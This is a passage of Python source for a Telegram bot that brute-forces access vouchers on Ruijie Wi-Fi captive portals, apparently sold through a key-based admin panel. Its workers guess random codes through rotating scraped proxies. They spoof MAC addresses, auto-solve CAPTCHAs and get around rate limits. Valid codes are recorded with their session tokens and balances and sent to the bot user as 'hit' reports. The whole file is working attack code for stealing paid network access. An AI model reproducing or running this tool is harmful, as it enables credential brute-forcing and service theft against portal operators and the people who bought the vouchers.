    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    while not ud["stop_event"].is_set():
        if _shutdown_flag:
            return
        if _cpu_paused:
            await asyncio.sleep(0.15)
            continue
        proxy = await pm.get_next()
        if proxy is None:
            await asyncio.sleep(1)
            continue
        proxy_connector = create_connector_for_proxy(proxy)
        if proxy_connector is None:
            await asyncio.sleep(0.5)
            continue
        async with aiohttp.ClientSession(
            connector=proxy_connector,
            connector_owner=True,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC)
        ) as session:
            current_session_id = None
            codes_checked_this_sid = 0
            codes_checked_this_session = 0
            sid_failures = 0
            while not ud["stop_event"].is_set() and codes_checked_this_session < MAX_CODES_PER_SESSION:
                if _cpu_paused:
                    await asyncio.sleep(0.15)
                    continue
                if current_session_id is None or codes_checked_this_sid >= MAX_CODES_PER_SID:
                    sid, mac = await get_sid_from_gateway(session, ud["portal_url"], user_id)
                    if sid is None:
                        sid_failures += 1
                        if sid_failures >= 2:
                            await pm.mark_bad(proxy)
                            break
                        await asyncio.sleep(0.3)
                        continue
                    current_session_id = sid
                    codes_checked_this_sid = 0
                    sid_failures = 0
                code = None
                for _ in range(10):
                    if ud["mode"] == "custom" and ud["start_digit"] is not None:
                        body_chars = random.choices(ud["char_set"], k=ud["code_len"] - 1)
                        random.shuffle(body_chars)
                        code = ud["start_digit"] + "".join(body_chars)
                    else:
                        code = "".join(random.choices(ud["char_set"], k=ud["code_len"]))
                    if code not in ud["tried_codes"]:
                        ud["tried_codes"].add(code)
                        break
                if code is None or ud["stop_event"].is_set():
                    break
                ud["CURRENT_CODE"] = code
                result = await check_single_access_code(session, code, current_session_id,
                                                        login_url, captcha_base_url, verify_url,
                                                        headers, user_id, proxy)
                codes_checked_this_sid += 1
                codes_checked_this_session += 1
                if result == "limit":
                    current_session_id = None


# ═══════════════════════════════════════════════════════════════
#  📊 LIVE DASHBOARD
# ═══════════════════════════════════════════════════════════════
async def live_dashboard_updater(context, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    last_tried = 0
    last_time = time.time()
    while not ud["stop_event"].is_set():
        if ud["dash_msg_id"] is None:
            await asyncio.sleep(0.3)
            continue
        try:
            stats = ud["stats"]
            elapsed = time.time() - stats["start_time"]
            speed_cpm = (stats["tried"] / elapsed) * 60 if elapsed > 0 else 0
            now = time.time()
            dt = now - last_time
            inst_speed = ((stats["tried"] - last_tried) / dt) * 60 if dt > 0 else 0
            last_tried = stats["tried"]
            last_time = now
            proxy_total, proxy_active = pm.stats()
            hit_list = []
            fetching_count = 0
            for item in ud["valid_codes"]:
                c = item["code"]
                balance = item.get("balance_str", "...fetching...")
                if balance.startswith("..."):
                    fetching_count += 1
                src = item.get("source", "...")
                src_icon = "🌐" if src == "proxy" else ("📡" if src == "direct" else "⏳")
                hit_list.append(f"`{c}` {balance} {src_icon}")
            hit_str = "\n".join(hit_list) if hit_list else "None yet"
            shield_icon = "🛡️" if _cpu_paused else "⚡"
            text = (
                f"⚡ Scanner Running ⚡\n"
                f"{BOT_TAGLINE}\n"
                f"{DIV}\n"
                f"🏹 Tried: {stats['tried']:,}\n"
                f"🎯 Current Code: `{ud['CURRENT_CODE']}`\n"
                f"🔥 Hits: {stats['hits']}\n"
                f"⏳ Fetching: {fetching_count}\n"
                f"⚔️ Expired: {stats['expired']}\n"
                f"⚠️ Limits: {stats['limits']}\n"
                f"⚡ Speed: {speed_cpm:.1f} c/m (now {inst_speed:.1f})\n"
                f"🔀 Proxies: {proxy_active}/{proxy_total}\n"
                f"👷 Workers: {ud['num_workers']}\n"
                f"{shield_icon} Shield: {'PAUSED' if _cpu_paused else 'ACTIVE'}\n"
                f"{DIV}\n"
                f"🔥 **Hit Codes**:\n{hit_str}\n"
                f"{DIV}\n"
            )
            if ud["recent_logs"]:
                last_log = ud["recent_logs"][-1]
                text += f"🔥 Last: {last_log}\n"
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(text="🛑 Stop", callback_data="stop_scan")]
            ])
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=ud["dash_msg_id"],
                text=text,
                reply_markup=keyboard,
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception:
            pass
        try:
            await asyncio.wait_for(ud["dash_update_event"].wait(), timeout=5.0)
            ud["dash_update_event"].clear()
        except asyncio.TimeoutError:
            pass


# ═══════════════════════════════════════════════════════════════
#  🔄 AUTO RETRY
# ═══════════════════════════════════════════════════════════════
def _is_pending(item):
    if not item:
        return False
    bs = item.get("balance_str", "")
    if bs.startswith("..."):
        return True
    if bs.startswith("❌") or bs.startswith("⚠️"):
        return True
    return False


async def auto_retry_pending(ud, context, user_id):
    pending = [it for it in ud["valid_codes"] if _is_pending(it)]
    if not pending:
        return

    total = len(pending)
    try:
        retry_msg = await context.bot.send_message(
            user_id,
            f"🔄 Auto retrying {total} pending/error balance(s)...\n"
            f"⚡ Concurrency: {RETRY_CONCURRENCY}"
        )
    except Exception:
        retry_msg = None

    sem = asyncio.Semaphore(RETRY_CONCURRENCY)
    lock = asyncio.Lock()
    done_count = {"n": 0}
    success_count = {"n": 0}

    async def _retry_one(it):
        async with sem:
            token = it.get("active_token")
            if not token:
                it["balance_str"] = "❌ no token"
                it["source"] = "❌"
            else:
                try:
                    bal, src = await fetch_balance_fast(token, preferred_proxy=None)
                    it["balance_str"] = bal
                    it["source"] = src
                    if not bal.startswith("❌") and not bal.startswith("⚠️"):
                        async with lock:
                            success_count["n"] += 1
                except Exception as e:
                    it["balance_str"] = f"❌ {type(e).__name__}"
                    it["source"] = "❌"
            async with lock:
                done_count["n"] += 1
                if done_count["n"] % 3 == 0 or done_count["n"] == total:
                    try:
                        if retry_msg:
                            await context.bot.edit_message_text(
                                chat_id=user_id,
                                message_id=retry_msg.message_id,
                                text=(
                                    f"🔄 Auto retry: {done_count['n']}/{total}\n"
                                    f"✅ Success: {success_count['n']}"
                                )
                            )
                    except Exception:
                        pass

    tasks = [asyncio.create_task(_retry_one(it)) for it in pending]
    await asyncio.gather(*tasks, return_exceptions=True)

    try:
        if retry_msg:
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=retry_msg.message_id,
                text=f"✅ Auto retry done. {total} codes processed, {success_count['n']} success."
            )
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
#  🚀 START SCANNER
# ═══════════════════════════════════════════════════════════════
async def run_user_scanner(context, user_id):
    global _cpu_paused, _shutdown_flag, _next_pattern_break
    _cpu_paused = False
    _shutdown_flag = False
    _next_pattern_break = time.time() + random.uniform(
        PATTERN_BREAK_INTERVAL_MIN, PATTERN_BREAK_INTERVAL_MAX)
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    if proxy_total == 0:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"⚠️ **No proxies loaded!**\n\n",
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception:
            pass

    login_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    captcha_base_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/image"
    verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "https://portal-as.ruijienetworks.com",
        "Referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
    }

    ud["balance_queue"] = asyncio.Queue()
    ud["dash_update_event"].clear()
    tasks = [asyncio.create_task(live_dashboard_updater(context, user_id))]
    worker_count = ud.get("num_workers", NUM_WORKERS)
    for i in range(worker_count):
        tasks.append(asyncio.create_task(worker(i, login_url, captcha_base_url, verify_url, headers, user_id)))
    for bw in range(BALANCE_WORKERS):
        tasks.append(asyncio.create_task(balance_worker(user_id, bw)))

    # ★ Replit-shield watchdog — CPU/RAM/FD 自動 pause/resume
    wd = get_watchdog(user_id)
    if not wd.running:
        tasks.append(asyncio.create_task(wd.loop()))

    ud["task"] = asyncio.current_task()
    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        for t in tasks:
            if not t.done():
                t.cancel()
        raise
    finally:
        stats = ud["stats"]
        elapsed = time.time() - stats["start_time"]
        speed_cpm = (stats["tried"] / elapsed) * 60 if elapsed > 0 else 0
        proxy_total, proxy_active = pm.stats()
        hit_list = []
        for item in ud["valid_codes"]:
            c = item["code"]
            balance = item.get("balance_str", "...fetching...")
            hit_list.append(f"{c} {balance}")
        hit_str = "\n".join(hit_list) if hit_list else "None"
        final_text = (
            f"🛑 Scanner Stopped/Finished\n"
            f"{DIV}\n"
            f"🔋 Total Tried: {stats['tried']:,}\n"
            f"🟢 Hits: {stats['hits']}\n"
            f"⚡ Final Speed: {speed_cpm:.1f} c/m\n"
            f"🔀 Proxies: {proxy_active}/{proxy_total}\n"
            f"{DIV}\n"
            f"📋 **All Hit Codes**:\n{hit_str}\n"
            f"{DIV}\n"
        )
        if ud["dash_msg_id"]:
            try:
                await context.bot.edit_message_text(chat_id=user_id, message_id=ud["dash_msg_id"], text=final_text)
            except Exception:
                try:
                    await context.bot.send_message(chat_id=user_id, text=final_text)
                except Exception:
                    pass
        else:
            try:
                await context.bot.send_message(chat_id=user_id, text=final_text)
            except Exception:
                pass

        await auto_retry_pending(ud, context, user_id)

        if ud["valid_codes"]:
            try:
                import datetime as _dt
                timestamp = _dt.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"hits_{user_id}_{timestamp}.txt"
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(f"=== HIT CODES REPORT ===\n")
                    f.write(f"User ID : {user_id}\n")
                    f.write(f"Date    : {_dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Tried   : {stats['tried']:,}\n")
                    f.write(f"Hits    : {stats['hits']}\n")
                    f.write(f"Speed   : {speed_cpm:.1f} c/m\n")
                    f.write(f"{'=' * 40}\n\n")
                    for item in ud["valid_codes"]:
                        src = item.get("source", "...")
                        f.write(f"{item['code']} | {item.get('balance_str', 'N/A')} | {src}\n")
                with open(filename, "rb") as f:
                    await context.bot.send_document(
                        chat_id=user_id,
                        document=f,
                        caption=f"📋 Hit Codes Report\n🟢 Total: {len(ud['valid_codes'])} hits (after auto retry)"
                    )
                try:
                    os.remove(filename)
                except Exception:
                    pass
            except Exception as e:
                print(f"[HitFile] Error sending hit codes file: {e}")

        ud["stop_event"].clear()
        ud["dash_msg_id"] = None
        ud["task"] = None
        ResourceWatchdog._trim_heap()
        gc.collect()


# ═══════════════════════════════════════════════════════════════
#  🔍 PROXY CHECKER (Ruijie API နှင့် တိုက်ရိုက်စစ်ဆေးခြင်း)
# ═══════════════════════════════════════════════════════════════
async def fetch_proxy_list(url):
    proxies = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=15) as resp:
                if resp.status == 200:
                    content_type = resp.headers.get("content-type", "")
                    if "application/json" in content_type:
                        data = await resp.json()
                        items = None
                        if isinstance(data, list):
                            items = data
                        elif isinstance(data, dict):
                            for key in ("data", "items", "results"):
                                if key in data and isinstance(data[key], list):
                                    items = data[key]
                                    break
                        if items:
                            for item in items:
                                if isinstance(item, dict) and "ip" in item and "port" in item:
                                    ip = str(item["ip"]).strip()
                                    port = str(item["port"]).strip()
                                    if ip and port:
                                        proxies.append(f"http://{ip}:{port}")
                    else:
                        text = await resp.text()
                        for line in text.splitlines():
                            line = line.strip()
                            if line and not line.startswith("#"):
                                if not line.startswith(("http://", "https://")):
                                    line = "http://" + line
                                proxies.append(line)
    except Exception as e:
        print(f"Error fetching {url}: {e}")
    return proxies


async def check_proxy_working(session, proxy, portal_url, semaphore, stop_event, user_id):
    async with semaphore:
        if stop_event.is_set():
            return None
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            ud = get_user_data(user_id)
            user_portal = ud.get("portal_url")
            test_url = user_portal if user_portal else portal_url

            u = urlparse(test_url)
            query = parse_qs(u.query)
            mac = generate_random_mac()
            query["mac"] = [mac]
            spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))

            # ★★★ Ruijie API ကို တိုက်ရိုက်ခေါ်ပြီး စစ်ဆေးခြင်း ★★★
            async with session.get(spoofed_url, headers=headers, timeout=8, ssl=False, proxy=proxy) as r2:
                body = await r2.text()
                # Ruijie Portal Page ဖြစ်ကြောင်း အတည်ပြုနိုင်တဲ့ စာသား ရှိမရှိ စစ်တယ်
                if "ruijie" in body.lower() or "portal" in body.lower() or "sessionId" in body:
                    match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
                    if match:
                        final_url = urljoin(spoofed_url, match.group(1))
                        async with session.get(final_url, headers=headers, timeout=8, ssl=False, proxy=proxy) as r3:
                            final_url = str(r3.url)
                    else:
                        final_url = str(r2.url)

                    parsed_query = parse_qs(urlparse(final_url).query)
                    sid = parsed_query.get("sessionId", parsed_query.get("sid", [None]))[0]
                    if sid:
                        return proxy
                # တခြား Ruijie API (captcha) ကို စမ်းစစ်တယ်
                captcha_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId=healthcheck"
                async with session.get(captcha_url, headers=headers, timeout=5, ssl=False, proxy=proxy) as cr:
                    if cr.status == 200:
                        return proxy
        except Exception:
            pass
        return None


async def run_proxy_check(context, chat_id, user_id, sources=None):
    stop_event = asyncio.Event()
    user_proxy_checks[user_id] = {"stop_event": stop_event, "msg_id": None, "task": asyncio.current_task()}
    if sources is None:
        sources = PROXY_SOURCES

    ud = get_user_data(user_id)
    user_portal = ud.get("portal_url")

    try:
        init_msg = await context.bot.send_message(
            chat_id,
            f"🔍 PROXY CHECKER 🔍\n"
            f"{BOT_TAGLINE}\n"
            f"{DIV}\n"
            f"⏳ Downloading proxy list...",
        )
    except Exception as e:
        print(f"[ProxyCheck] {e}")
        return
    progress_msg_id = init_msg.message_id

    stop_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🛑 STOP & SAVE 🛑", callback_data="proxy_check_stop")]
    ])

    all_proxies = []
    for i, url in enumerate(sources, 1):
        if stop_event.is_set():
            break
        p = await fetch_proxy_list(url)
        all_proxies.extend(p)
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=progress_msg_id,
                text=(
                    f"🔍 PROXY CHECKER 🔍\n"
                    f"{BOT_TAGLINE}\n"
                    f"{DIV}\n"
                    f"📥 Downloading...\n"
                    f"🌐 Source: {i}/{len(sources)}\n"
                    f"📊 Current: {len(p)}\n"
                    f"🎯 Total: {len(all_proxies)}"
                ),
                reply_markup=stop_kb,
            )
        except Exception:
            pass

    seen = set()
    unique_proxies = []
    for p in all_proxies:
        if p not in seen:
            seen.add(p)
            unique_proxies.append(p)

    if not unique_proxies:
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=progress_msg_id,
                text="❌ No proxies found",
            )
        except Exception:
            pass
        user_proxy_checks.pop(user_id, None)
        return

    total = len(unique_proxies)
    CONCURRENCY = 100
    semaphore = asyncio.Semaphore(CONCURRENCY)
    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    timeout = aiohttp.ClientTimeout(total=8)
    good_proxies = []
    checked = 0
    last_update = time.time()

    portal_url = user_portal if user_portal else (
        "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=c4b25b4e24cf&gw_sn=H1TC2LY000735&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.170&mac=5e:21:ad:5d:13:0d&slot_num=14&nasip=192.168.1.71&ssid=PAING&ustate=0&mac_req=1"
    )

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        for proxy in unique_proxies:
            task = asyncio.create_task(check_proxy_working(session, proxy, portal_url, semaphore, stop_event, user_id))
            tasks.append(task)

        for completed_task in asyncio.as_completed(tasks):
            if stop_event.is_set():
                for t in tasks:
                    if not t.done():
                        t.cancel()
                break
            try:
                result = await completed_task
            except Exception:
                result = None
            if result:
                good_proxies.append(result)
            checked += 1

            now = time.time()
            if checked % 50 == 0 or now - last_update > 2 or checked == total:
                last_update = now
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id, message_id=progress_msg_id,
                        text=(
                            f"🔍 PROXY CHECKER 🔍\n"
                            f"{BOT_TAGLINE}\n"
                            f"{DIV}\n"
                            f"📊 Checked: {checked}/{total}\n"
                            f"✅ Working: {len(good_proxies)}\n"
                            f"{DIV}"
                        ),
                        reply_markup=stop_kb,
                    )
                except Exception:
                    pass

    pm = get_proxy_manager()
    added = pm.add_proxies(good_proxies)

    if stop_event.is_set():
        final_text = (
            f"🛑 PROXY CHECK STOPPED\n"
            f"{DIV}\n"
            f"✅ Found: {len(good_proxies)}\n"
            f"📥 Added: {added} new\n"
            f"💾 Saved to {PROXY_FILE}"
        )
    else:
        final_text = (
            f"✅ PROXY CHECK DONE\n"
            f"{DIV}\n"
            f"🎯 Total: {total:,}\n"
            f"✅ Working: {len(good_proxies)}\n"
            f"📥 Added: {added} new\n"
            f"💾 Saved to {PROXY_FILE}"
        )

    try:
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=progress_msg_id,
            text=final_text,
        )
    except Exception:
        pass

    if good_proxies:
        try:
            import datetime as _dt
            timestamp = _dt.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"good_proxies_{user_id}_{timestamp}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                for p in good_proxies:
                    f.write(f"{p}\n")
            with open(filename, "rb") as f:
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=f,
                    caption=f"✅ Working proxies: {len(good_proxies)}/{total}"
                )
            try:
                os.remove(filename)
            except Exception:
                pass
        except Exception as e:
            print(f"[ProxyFile] Send error: {e}")

    user_proxy_checks.pop(user_id, None)


# ═══════════════════════════════════════════════════════════════
#  💳 MANUAL BALANCE CHECKER (FAST - from leeee.py)
# ═══════════════════════════════════════════════════════════════
def split_codes(raw: str, expected_len: int = None):
    cleaned = re.sub(r'[\s,;|]+', '\n', raw.strip())
    parts = [p.strip() for p in cleaned.split('\n') if p.strip()]
    codes = []
    seen = set()
    for p in parts:
        c = re.sub(r'[^A-Za-z0-9]', '', p)
        if not c:
            continue
        if expected_len is not None and len(c) != expected_len:
            continue
        if c not in seen:
            seen.add(c)
            codes.append(c)
    return codes


def get_manual_balance_state(user_id: int):
    if user_id not in user_manual_balance:
        user_manual_balance[user_id] = {
            'mode': 'num6',
            'code_len': 6,
            'state': None,
            'codes': [],
            'results': [],
            'running': False,
            'stop_event': asyncio.Event(),
            'msg_id': None,
            'task': None,
            'lock': asyncio.Lock(),
        }
    return user_manual_balance[user_id]


async def _process_one_code(code, st, ud, user_id, login_url, captcha_base_url, verify_url, headers, counter):
    pm = get_proxy_manager()
    token = None
    balance_str = "❌ failed"
    source = "❌"
    got_limit = False

    for attempt in range(3):
        if st['stop_event'].is_set():
            break
        proxy = await pm.get_next()
        if not proxy:
            break
        try:
            connector = create_connector_for_proxy(proxy)
            if connector is None:
                continue
            async with aiohttp.ClientSession(
                connector=connector,
                connector_owner=True,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as session:
                sid, mac = await get_sid_from_gateway(session, ud['portal_url'], user_id)
                if not sid:
                    await pm.mark_bad(proxy)
                    continue

                captcha_url = f"{captcha_base_url}?sessionId={sid}"
                auth_code = await solve_captcha_simple_async(session, captcha_url, headers)
                if not auth_code or len(auth_code) < 2:
                    continue

                v_payload = {"sessionId": sid, "authCode": auth_code}
                async with session.post(verify_url, json=v_payload, headers=headers, ssl=False, timeout=6) as v_resp:
                    if v_resp.status != 200:
                        continue
                    v_data = await v_resp.json()
                    if not v_data.get("success"):
                        continue

                    l_payload = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth_code}
                    async with session.post(login_url, json=l_payload, headers=headers, ssl=False, timeout=8) as l_resp:
                        l_text = await l_resp.text()
                        l_lower = l_text.lower()

                        if '"success":true' in l_lower:
                            token_match = re.search(r'token=([^&\s"\'<>]+)', l_text)
                            if token_match:
                                token = token_match.group(1)
                                pm.mark_good(proxy)
                                break
                            else:
                                balance_str = "❌ no token"
                                break
                        elif "expired" in l_lower:
                            balance_str = "❌ expired"
                            break
                        elif "request limited" in l_lower:
                            got_limit = True
                            continue
                        elif "exceeds the limit" in l_lower or "limit" in l_lower:
                            got_limit = True
                            continue
                        else:
                            balance_str = "❌ invalid"
                            break
        except Exception:
            try:
                await pm.mark_bad(proxy)
            except Exception:
                pass
            continue

    if token:
        bal_result = None
        chosen = await pm.get_next()
        if chosen:
            for retry in range(3):
                ok, res = await fetch_balance_with_proxy(token, chosen, timeout=3)
                if ok:
                    bal_result = res
                    source = "proxy"
                    pm.mark_good(chosen)
                    break
            if bal_result is None:
                await pm.mark_bad(chosen)
        if bal_result is None:
            ok, res = await fetch_balance_direct(token, timeout=5)
            bal_result = res if ok else f"❌ {res}"
            source = "direct"
        balance_str = bal_result
    elif got_limit:
        balance_str = "⚠️ limit"
        source = "limit"

    async with st['lock']:
        if source == "proxy":
            counter['proxy'] += 1
        elif source == "direct":
            counter['direct'] += 1
        elif source == "limit":
            counter['limit'] += 1
        else:
            counter['failed'] += 1
        counter['done'] += 1

    return {'code': code, 'balance': balance_str, 'source': source}


async def run_manual_balance_check(context: ContextTypes.DEFAULT_TYPE, chat_id: int, user_id: int):
    st = get_manual_balance_state(user_id)
    st['running'] = True
    st['stop_event'].clear()
    st['results'] = []

    codes = st['codes']
    total = len(codes)
    if total == 0:
        try:
            await context.bot.send_message(chat_id, "❌ Code list ဗလာဖြစ်နေပါသည်။")
        except Exception:
            pass
        st['running'] = False
        return

    ud = get_user_data(user_id)
    portal_url = ud.get('portal_url')
    if not portal_url:
        await context.bot.send_message(chat_id, "❌ Portal URL မရှိပါ။ Update Portal အရင်လုပ်ပါ။")
        st['running'] = False
        return

    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()

    login_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    captcha_base_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/image"
    verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "https://portal-as.ruijienetworks.com",
        "Referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
    }

    try:
        status_msg = await context.bot.send_message(
            chat_id,
            f"💳 Manual Balance Check (FAST)\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"⚙️ Mode        : {st['mode']} ({st['code_len']} digit)\n"
            f"📋 Total codes : {total}\n"
            f"🔀 Proxies     : {proxy_active}/{proxy_total}\n"
            f"⚡ Concurrency : {MANUAL_CONCURRENCY}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Starting..."
        )
        st['msg_id'] = status_msg.message_id
    except Exception as e:
        print(f"[ManualBalance] Cannot send msg: {e}")
        st['running'] = False
        return

    counter = {'done': 0, 'proxy': 0, 'direct': 0, 'limit': 0, 'failed': 0}
    results = []
    last_edit = time.time()
    sem = asyncio.Semaphore(MANUAL_CONCURRENCY)

    async def _bounded(code):
        async with sem:
            if st['stop_event'].is_set():
                return None
            res = await _process_one_code(code, st, ud, user_id,
                                          login_url, captcha_base_url, verify_url,
                                          headers, counter)
            nonlocal last_edit
            now = time.time()
            if counter['done'] == total or now - last_edit > 1.5 or counter['done'] % 3 == 0:
                last_edit = now
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=st['msg_id'],
                        text=(
                            f"💳 Manual Balance (FAST)\n"
                            f"━━━━━━━━━━━━━━━━━━\n"
                            f"⚙️ Mode        : {st['mode']} ({st['code_len']} digit)\n"
                            f"📊 Checked     : {counter['done']}/{total}\n"
                            f"🌐 Proxy hits  : {counter['proxy']}\n"
                            f"📡 Direct hits : {counter['direct']}\n"
                            f"⚠️ Limited     : {counter['limit']}\n"
                            f"❌ Failed      : {counter['failed']}\n"
                            f"━━━━━━━━━━━━━━━━━━\n"
                            f"🎯 Current     : {code}\n"
                        )
                    )
                except Exception:
                    pass
            return res

    task_list = [asyncio.create_task(_bounded(c)) for c in codes]
    for t in asyncio.as_completed(task_list):
        if st['stop_event'].is_set():
            for tt in task_list:
                if not tt.done():
                    tt.cancel()
            break
        try:
            r = await t
            if r:
                results.append(r)
        except Exception:
            pass

    st['results'] = results
    st['running'] = False

    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=st['msg_id'],
            text=(
                f"✅ Manual Balance Done (FAST)\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"⚙️ Mode        : {st['mode']} ({st['code_len']} digit)\n"
                f"📋 Total       : {total}\n"
                f"🌐 Proxy hits  : {counter['proxy']}\n"
                f"📡 Direct hits : {counter['direct']}\n"
                f"⚠️ Limited     : {counter['limit']}\n"
                f"❌ Failed      : {counter['failed']}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
            )
        )
    except Exception:
        pass

    if results:
        try:
            import datetime as _dt
            ts = _dt.datetime.now().strftime('%Y%m%d_%H%M%S')
            fname = f"manual_balance_{user_id}_{ts}.txt"
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(f"=== MANUAL BALANCE REPORT ===\n")
                f.write(f"User ID : {user_id}\n")
                f.write(f"Date    : {_dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Mode    : {st['mode']} ({st['code_len']} digit)\n")
                f.write(f"Total   : {total}\n")
                f.write(f"Proxy   : {counter['proxy']}\n")
                f.write(f"Direct  : {counter['direct']}\n")
                f.write(f"Limited : {counter['limit']}\n")
                f.write(f"Failed  : {counter['failed']}\n")
                f.write(f"{'=' * 40}\n\n")
                for r in results:
                    f.write(f"{r['code']} | {r['balance']} | {r['source']}\n")
            with open(fname, 'rb') as f:
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=f,
                    caption=f"📋 Manual Balance Report\n"
                            f"🌐 Proxy: {counter['proxy']} | 📡 Direct: {counter['direct']} | "
                            f"⚠️ Limit: {counter['limit']} | ❌ Failed: {counter['failed']}"
                )
            try:
                os.remove(fname)
            except Exception:
                pass
        except Exception as e:
            print(f"[ManualBalance] File send error: {e}")


# ═══════════════════════════════════════════════════════════════
#  👑 ADMIN PANEL
# ═══════════════════════════════════════════════════════════════
def get_admin_panel_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Generate Key", callback_data="admin_gen_key"),
         InlineKeyboardButton("🗑 Delete Key", callback_data="admin_del_key")],
        [InlineKeyboardButton("📋 List Keys", callback_data="admin_list_keys"),
         InlineKeyboardButton("👥 Users List", callback_data="admin_users_list")],
        [InlineKeyboardButton("📇 Bot Users", callback_data="admin_bot_users"),
         InlineKeyboardButton("👤 Set User", callback_data="admin_set_user")],
        [InlineKeyboardButton("♾ Set Unlimited", callback_data="admin_set_unlimited"),
         InlineKeyboardButton("📊 Bot Stats", callback_data="admin_bot_stats")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
         InlineKeyboardButton("👑 Admin IDs", callback_data="admin_list_admins")],
        [InlineKeyboardButton("➕ Add Proxies", callback_data="admin_add_proxies"),
         InlineKeyboardButton("🔍 Check Proxies", callback_data="admin_check_proxies")],
        [InlineKeyboardButton("🔗 Manual Proxy URL", callback_data="admin_manual_url"),
         InlineKeyboardButton("♻️ Reset Proxies", callback_data="admin_reset_proxies")],
        [InlineKeyboardButton("🧹 CLEAR ALL KEYS 🧹", callback_data="admin_clear_all_keys")],
        [InlineKeyboardButton("🔙 Close", callback_data="admin_close")],
    ])


def get_clear_all_confirm_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅  YES, CLEAR ALL", callback_data="admin_clear_all_confirm"),
         InlineKeyboardButton("❌  CANCEL", callback_data="admin_panel")],
    ])


def get_admin_duration_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⏱ 1 Hour", callback_data="admin_dur_1h"),
         InlineKeyboardButton("⏱ 2 Hours", callback_data="admin_dur_2h")],
        [InlineKeyboardButton("⏱ 6 Hours", callback_data="admin_dur_6h"),
         InlineKeyboardButton("⏱ 12 Hours", callback_data="admin_dur_12h")],
        [InlineKeyboardButton("📅 1 Day", callback_data="admin_dur_1d"),
         InlineKeyboardButton("📅 2 Days", callback_data="admin_dur_2d")],
        [InlineKeyboardButton("📅 3 Days", callback_data="admin_dur_3d"),
         InlineKeyboardButton("📅 5 Days", callback_data="admin_dur_5d")],
        [InlineKeyboardButton("📅 7 Days", callback_data="admin_dur_7d"),
         InlineKeyboardButton("📅 10 Days", callback_data="admin_dur_10d")],
        [InlineKeyboardButton("📅 15 Days", callback_data="admin_dur_15d"),
         InlineKeyboardButton("📅 30 Days", callback_data="admin_dur_30d")],
        [InlineKeyboardButton("📅 1 Year", callback_data="admin_dur_1y"),
         InlineKeyboardButton("♾ Unlimited", callback_data="admin_dur_unlimited")],
        [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")],
    ])


def get_extend_duration_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ +1h", callback_data="extend_add_1h"),
         InlineKeyboardButton("➕ +2h", callback_data="extend_add_2h")],
        [InlineKeyboardButton("➕ +6h", callback_data="extend_add_6h"),
         InlineKeyboardButton("➕ +12h", callback_data="extend_add_12h")],
        [InlineKeyboardButton("➕ +1d", callback_data="extend_add_1d"),
